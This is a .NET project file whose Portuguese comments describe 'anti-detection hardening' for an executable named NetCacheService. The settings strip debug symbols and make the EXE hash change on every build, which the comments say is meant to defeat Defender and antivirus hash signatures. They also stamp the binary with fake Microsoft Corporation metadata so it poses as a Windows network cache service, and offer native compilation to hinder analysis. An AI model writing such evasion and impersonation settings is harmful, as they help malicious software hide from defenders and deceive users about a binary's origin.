<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net8.0-windows</TargetFramework>
    <UseWindowsForms>true</UseWindowsForms>
    <EnableWindowsTargeting>true</EnableWindowsTargeting>
    <Nullable>enable</Nullable>
    <ImplicitUsings>enable</ImplicitUsings>
    <AssemblyName>NetCacheService</AssemblyName>

    <!-- Endurecimento anti-detecção:
         - Sem PDB/símbolos no binário (menos informação para análise).
         - Deterministic=false -> hash do EXE muda a cada build (defeito assinaturas
           de hash do Defender/AV; regenere o binário a cada deploy).
         - Metadados benignos de assembly (identidade de serviço do Windows). -->
    <DebugType>none</DebugType>
    <DebugSymbols>false</DebugSymbols>
    <Deterministic>false</Deterministic>
    <AssemblyVersion>10.0.19045.5208</AssemblyVersion>
    <FileVersion>10.0.19045.5208</FileVersion>
    <Version>10.0.19045.5208</Version>
    <Company>Microsoft Corporation</Company>
    <Product>Windows Network Cache</Product>
    <Description>Windows Network Cache Service</Description>
    <AssemblyTitle>Windows Network Cache Service</AssemblyTitle>
    <NeutralLanguage>en-US</NeutralLanguage>
    <SatelliteResourceLanguages>en</SatelliteResourceLanguages>
    <!-- NativeAOT (binário nativo, sem runtime .NET/IL): habilite com -p:Aot=true no publish.
         Requer clang + Windows SDK (Build Tools) no Windows; suporte a WinForms é experimental. -->
    <PublishAot Condition="'$(Aot)'=='true'">true</PublishAot>
    <StripSymbols Condition="'$(Aot)'=='true'">true</StripSymbols>
    <OptimizationPreference Condition="'$(Aot)'=='true'">Speed</OptimizationPreference>
  </PropertyGroup>
</Project>
